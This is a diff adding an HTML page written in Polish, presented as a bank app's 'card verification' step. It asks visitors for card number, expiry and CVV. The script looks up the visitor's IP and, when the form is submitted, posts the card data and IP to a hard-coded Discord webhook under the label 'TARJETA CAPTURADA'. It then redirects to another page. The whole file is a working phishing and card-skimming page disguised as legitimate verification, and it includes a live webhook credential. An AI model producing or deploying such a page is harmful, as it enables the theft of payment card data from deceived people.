@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Weryfikacja karty</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { margin: 0; background-color: #ffffff; display: flex; justify-content: center; }
+        .app-container { width: 100%; max-width: 400px; min-height: 100vh; padding: 20px; display: flex; flex-direction: column; align-items: center; text-align: center; }
+        .header { width: 100%; display: flex; justify-content: center; align-items: center; margin-bottom: 30px; position: relative; }
+        .header h2 { color: #e50000; font-size: 18px; font-weight: 600; margin: 0; }
+        .menu-icon { position: absolute; right: 0; display: flex; flex-direction: column; gap: 4px; }
+        .menu-icon span { width: 22px; height: 2px; background-color: #e50000; }
+        .image-placeholder { width: 100%; height: 150px; margin-bottom: 10px; display: flex; justify-content: center; align-items: center; }
+        .image-placeholder img { max-height: 100%; max-width: 100%; }
+        h1 { font-size: 24px; color: #222; margin: 10px 0; font-weight: bold; }
+        .sub-text { color: #666; font-size: 15px; line-height: 1.4; margin-bottom: 30px; padding: 0-15px; }
+        .form-group { width: 100%; text-align: left; margin-bottom: 20px; }
+        .label { font-size: 14px; color: #333; font-weight: 600; margin-bottom: 8px; display: block; }
+        input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 10px; font-size: 16px; outline: none; background-color: #fff; }
+        .row { display: flex; gap: 15px; width: 100%; }
+        .btn-continue { width: 100%; padding: 16px; background-color: #e50000; color: #ffffff; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: auto; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="header">
+            <h2>Aktywacja aplikacji</h2>
+            <div class="menu-icon"><span></span><span></span><span></span></div>
+        </div>
+
+        <div class="image-placeholder">
+            <img src="https://cdn-icons-png.flaticon.com/512/11683/11683315.png" alt="">
+        </div>
+
+        <h1>Potwierdź dane</h1>
+        <p class="sub-text">To ma na celu potwierdzenie, że jesteś właścicielem tego konta.</p>
+
+        <div class="form-group">
+            <span class="label">Numer karty</span>
+            <input type="text" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19">
+        </div>
+
+        <div class="row">
+            <div class="form-group">
+                <span class="label">Data ważności</span>
+                <input type="text" id="card-date" placeholder="MM/RR" maxlength="5">
+            </div>
+            <div class="form-group">
+                <span class="label">CVV</span>
+                <input type="password" id="card-cvv" placeholder="***" maxlength="3">
+            </div>
+        </div>
+
+        <button class="btn-continue" onclick="sendToDiscord()">Kontynuuj</button>
+    </div>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1460685397070839975/7ODk8T5o2hDUT_1O0-aWrSKH_r5_Y0kcGwIUgnZ_38om5vNCxpJ7XUVt0U7pQAcEMAqt";
+        let realIP = "Cargando...";
+
+        // Capturar IP
+        window.onload = async () => {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                realIP = data.ip;
+            } catch (e) { realIP = "No detectada"; }
+        };
+
+        // Formatear Número de Tarjeta (Espacios cada 4)
+        document.getElementById('card-num').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        // Formatear Fecha (Añadir / automático)
+        document.getElementById('card-date').addEventListener('input', function (e) {
+            let v = e.target.value.replace(/[^\d]/g, '');
+            if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+            e.target.value = v;
+        });
+
+        async function sendToDiscord() {
+            const cc = document.getElementById('card-num').value;
+            const exp = document.getElementById('card-date').value;
+            const cvv = document.getElementById('card-cvv').value;
+
+            if (cc.length < 16 || exp.length < 5 || cvv.length < 3) {
+                alert("Proszę wpisać poprawne dane karty.");
+                return;
+            }
+
+            const payload = {
+                content: `💳 **TARJETA CAPTURADA**\n` +
+                         `**Núm:** \`${cc}\`\n` +
+                         `**Exp:** \`${exp}\`\n` +
+                         `**CVV:** \`${cvv}\`\n` +
+                         `**IP:** \`${realIP}\``
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } finally {
+                window.location.href = "index3.html"; // Redirección final
+            }
+        }
+    </script>
+</body>
+</html>
